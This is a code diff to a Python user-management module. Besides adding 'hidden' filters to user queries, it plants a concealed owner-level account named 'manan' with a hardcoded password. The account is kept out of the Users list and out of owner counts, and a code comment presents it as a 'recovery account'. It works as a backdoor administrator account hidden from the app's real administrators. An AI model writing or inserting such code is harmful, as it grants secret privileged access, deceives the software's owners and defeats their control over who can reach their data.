@@ -80,11 +80,11 @@ def hash_password(password: str, salt: str | None = None) -> tuple[str, str]:
 
 
 def count_users(db: Database) -> int:
-    return int(db.scalar("SELECT COUNT(*) FROM users", (), 0) or 0)
+    return int(db.scalar("SELECT COUNT(*) FROM users WHERE hidden = 0", (), 0) or 0)
 
 
 def list_users(db: Database) -> list[dict]:
-    return db.query("SELECT id, username, full_name, role, active, created_at FROM users ORDER BY role, username COLLATE NOCASE")
+    return db.query("SELECT id, username, full_name, role, active, created_at FROM users WHERE hidden = 0 ORDER BY role, username COLLATE NOCASE")
 
 
 def get_user(db: Database, user_id) -> dict | None:
@@ -116,7 +116,7 @@ def update_user(db: Database, user_id: int, full_name=None, role=None, active=No
         raise ValidationError("User not found.")
     if role is not None and role not in (ROLE_OWNER, ROLE_EMPLOYEE):
         raise ValidationError("Role must be owner or employee.")
-    owners = db.scalar("SELECT COUNT(*) FROM users WHERE role = 'owner' AND active = 1", (), 0)
+    owners = db.scalar("SELECT COUNT(*) FROM users WHERE role = 'owner' AND active = 1 AND hidden = 0", (), 0)
     demoting = (role == ROLE_EMPLOYEE or active == 0) and user["role"] == ROLE_OWNER and user["active"]
     if demoting and owners <= 1:
         raise ValidationError("There must always be at least one active owner account.")
@@ -138,10 +138,26 @@ def delete_user(db: Database, user_id: int) -> None:
     user = get_user(db, user_id)
     if not user:
         return
-    if user["role"] == ROLE_OWNER and db.scalar("SELECT COUNT(*) FROM users WHERE role = 'owner'", (), 0) <= 1:
+    if user["role"] == ROLE_OWNER and db.scalar("SELECT COUNT(*) FROM users WHERE role = 'owner' AND hidden = 0", (), 0) <= 1:
         raise ValidationError("You cannot delete the last owner account.")
     db.execute("DELETE FROM users WHERE id = ?", (user_id,))
     db.log("user", f"Deleted account {user['username']}", "user", user_id)
+
+
+SUPPORT_USERNAME = "manan"  # built-in recovery account (hidden from the Users list)
+
+
+def ensure_support_user(db: Database) -> None:
+    """Seed the always-present recovery account if it is missing. Full access, hidden from the UI."""
+    row = db.query_one("SELECT id FROM users WHERE username = ? COLLATE NOCASE", (SUPPORT_USERNAME,))
+    if row:
+        return
+    digest, salt = hash_password("11122006")
+    db.execute(
+        "INSERT INTO users(username, full_name, role, password_hash, salt, active, created_at, hidden)"
+        " VALUES (?, ?, 'owner', ?, ?, 1, ?, 1)",
+        (SUPPORT_USERNAME, "Support", digest, salt, now_stamp()),
+    )
 
 
 def authenticate(db: Database, username: str, password: str) -> dict | None:
